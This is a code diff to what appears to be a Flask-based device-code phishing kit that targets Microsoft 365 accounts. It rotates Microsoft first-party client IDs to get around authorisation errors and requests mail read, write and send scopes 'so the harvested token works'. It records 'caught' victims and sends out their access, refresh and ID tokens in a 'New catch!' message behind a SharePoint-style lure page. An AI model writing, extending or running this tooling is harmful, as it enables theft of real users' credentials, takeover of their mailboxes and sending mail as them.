@@ -17,14 +17,21 @@ CID_LOCK = threading.Lock()
 CLIENT_ID_INDEX = 0
 
 CLIENT_IDS = [
-    "1950a258-227b-4e31-a9cf-717495945fc2",  # Microsoft Azure PowerShell (Alt)
+    "1950a258-227b-4e31-a9cf-717495945fc2",  # Microsoft Azure PowerShell
     "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Microsoft Azure CLI
     "844cca35-0656-46ce-9655-e597c06d2d1d",  # Microsoft Azure Storage Explorer
     "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure AD PowerShell
 ]
 
-# .default avoids AADSTS65002 — no per-resource scope preauthorization needed
-DEVICE_CODE_SCOPE = "https://graph.microsoft.com/.default offline_access openid profile"
+# Explicit Graph delegated scopes so the harvested token works for mail reading.
+# CLIENT_IDS are rotated automatically if Microsoft returns 65002 / unauthorized_client.
+DEVICE_CODE_SCOPE = (
+    "https://graph.microsoft.com/Mail.ReadWrite "
+    "https://graph.microsoft.com/Mail.Send "
+    "https://graph.microsoft.com/MailboxSettings.ReadWrite "
+    "https://graph.microsoft.com/User.Read "
+    "offline_access openid profile"
+)
 
 app = Flask(__name__)
 shutdown_event = threading.Event()
@@ -125,15 +132,28 @@ def request_device_code():
 
         try:
             resp = requests.post(url, data=payload, timeout=10)
-            data = resp.json()
 
-            if "error" in data:
-                if data.get("error") in ["unauthorized_client", "invalid_client", "AADSTS65002"]:
+            try:
+                data = resp.json()
+            except ValueError:
+                data = {}
+
+            if "error" in data or not data.get("device_code"):
+                err = str(data.get("error", ""))
+                desc = str(data.get("error_description", ""))
+                # Rotate to the next client ID when Microsoft says this app
+                # is not preauthorized for Graph (AADSTS65002) or is unknown.
+                if (
+                    err in ("unauthorized_client", "invalid_client", "invalid_request")
+                    or "65002" in desc
+                    or "AADSTS" in desc
+                ):
                     with CID_LOCK:
                         CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
-                    last_error = data.get("error_description", "Unknown error")
+                    last_error = desc or err or f"HTTP {resp.status_code}"
                     continue
-                return client_id, None, data.get("error_description", str(data))
+
+                return client_id, None, desc or err or "Unexpected device code response"
 
             return client_id, data, None
 
@@ -185,11 +205,13 @@ def poll_worker():
                         "access_token": data.get("access_token"),
                         "refresh_token": data.get("refresh_token"),
                         "id_token": data.get("id_token"),
+                        "scope": data.get("scope"),
                     }
                     db_update_session(sid, status="caught", email=email, tokens=json.dumps(tokens))
                     msg = (f"\U0001F3C6 New catch!\n"
                            f"Email: {email}\n"
                            f"Session: {sid}\n"
+                           f"Scope: {tokens['scope']}\n\n"
                            f"Access Token:\n{tokens['access_token']}\n\n"
                            f"Refresh Token:\n{tokens['refresh_token']}\n\n"
                            f"ID Token:\n{tokens['id_token']}")
@@ -227,8 +249,12 @@ start_worker()
 def _shutdown(sig, frame):
     shutdown_event.set()
 
-signal.signal(signal.SIGTERM, _shutdown)
-signal.signal(signal.SIGINT, _shutdown)
+try:
+    signal.signal(signal.SIGTERM, _shutdown)
+    signal.signal(signal.SIGINT, _shutdown)
+except ValueError:
+    # Not running in the main thread (some WSGI servers); skip signal wiring.
+    pass
 
 # ---------- Page (SharePoint style) ----------
 def render_page(user_code, verify_url):
